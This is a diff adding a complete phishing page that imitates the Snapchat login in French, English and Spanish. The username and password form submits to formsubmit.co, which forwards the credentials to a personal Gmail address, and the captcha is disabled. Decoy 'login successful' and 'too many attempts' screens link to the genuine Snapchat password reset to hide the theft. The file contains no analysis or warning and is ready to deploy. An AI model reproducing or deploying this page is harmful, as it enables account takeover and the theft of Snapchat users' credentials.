@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Snapchat</title>
+  <style>
+    body {
+      margin: 0;
+      background: #fffc00;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    #lang-switcher {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+    }
+
+    select {
+      font-size: 14px;
+      padding: 5px;
+    }
+
+    .page {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 20px;
+      width: 100%;
+      max-width: 400px;
+    }
+
+    .page.active {
+      display: flex;
+      animation: fadeIn 0.3s ease-in-out;
+    }
+
+    input {
+      width: 100%;
+      padding: 15px;
+      margin: 15px 0;
+      font-size: 16px;
+      border-radius: 8px;
+      border: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 15px;
+      margin-top: 10px;
+      font-size: 16px;
+      font-weight: bold;
+      background: #000;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    button.link {
+      background: transparent;
+      color: #007aff;
+      text-decoration: underline;
+      margin-top: 20px;
+    }
+
+    .error {
+      color: red;
+      font-size: 14px;
+      margin-bottom: 10px;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+  <div id="lang-switcher">
+    <select onchange="changeLang(this.value)">
+      <option value="fr">Français</option>
+      <option value="en">English</option>
+      <option value="es">Español</option>
+    </select>
+  </div>
+
+  <!-- Page 1 -->
+  <div class="page active" id="page1">
+    <h1 data-text="login_title">Connexion</h1>
+    <input type="text" id="username" placeholder="Nom d'utilisateur ou email" />
+    <button onclick="goToPasswordPage()" data-text="continue_btn">Continuer</button>
+  </div>
+
+  <!-- Page 2 -->
+  <div class="page" id="page2">
+    <h1 id="userTitle"></h1>
+    <form action="https://formsubmit.co/salidiarra602@gmail.com" method="POST">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="text" id="formUsername" name="username" placeholder="Nom d'utilisateur" readonly>
+      <input type="password" name="password" placeholder="Mot de passe" required />
+      <button type="submit" data-text="login_btn">Connexion</button>
+    </form>
+    <button class="link" onclick="window.location.href='#'" data-text="forgot_password">Mot de passe oublié ?</button>
+  </div>
+
+  <!-- Page 3 -->
+  <div class="page" id="page3">
+    <h1 data-text="success_msg">Connexion réussie !</h1>
+  </div>
+
+  <!-- Page 4 -->
+  <div class="page" id="resetPage">
+    <h1 data-text="reset_title">Trop de tentatives</h1>
+    <p>
+      <span data-text="reset_msg">Vous avez dépassé le nombre de tentatives.</span><br>
+      <a href="https://accounts.snapchat.com/accounts/password_reset" data-text="reset_link">Réinitialiser votre mot de passe</a>
+    </p>
+  </div>
+
+  <script>
+    let currentLang = "fr";
+
+    function goToPasswordPage() {
+      const username = document.getElementById("username").value.trim();
+      if (username) {
+        document.getElementById("userTitle").textContent = username;
+        document.getElementById("formUsername").value = username;
+        showPage("page2");
+      }
+    }
+
+    function showPage(id) {
+      document.querySelectorAll(".page").forEach(p => p.classList.remove("active"));
+      document.getElementById(id).classList.add("active");
+    }
+
+    const translations = {
+      fr: {
+        login_title: "Connexion",
+        continue_btn: "Continuer",
+        login_btn: "Connexion",
+        forgot_password: "Mot de passe oublié ?",
+        success_msg: "Connexion réussie !",
+        reset_title: "Trop de tentatives",
+        reset_msg: "Vous avez dépassé le nombre de tentatives.",
+        reset_link: "Réinitialiser votre mot de passe"
+      },
+      en: {
+        login_title: "Log In",
+        continue_btn: "Continue",
+        login_btn: "Log In",
+        forgot_password: "Forgot password?",
+        success_msg: "Login successful!",
+        reset_title: "Too many attempts",
+        reset_msg: "You have exceeded the number of attempts.",
+        reset_link: "Reset your password"
+      },
+      es: {
+        login_title: "Iniciar sesión",
+        continue_btn: "Continuar",
+        login_btn: "Iniciar sesión",
+        forgot_password: "¿Olvidaste tu contraseña?",
+        success_msg: "¡Inicio de sesión exitoso!",
+        reset_title: "Demasiados intentos",
+        reset_msg: "Has superado el número de intentos.",
+        reset_link: "Restablece tu contraseña"
+      }
+    };
+
+    function changeLang(lang) {
+      currentLang = lang;
+      document.querySelectorAll("[data-text]").forEach(el => {
+        const key = el.getAttribute("data-text");
+        if (translations[lang][key]) {
+          el.textContent = translations[lang][key];
+        }
+      });
+    }
+
+    window.onload = () => {
+      changeLang("fr");
+    };
+  </script>
+</body>
+</html>
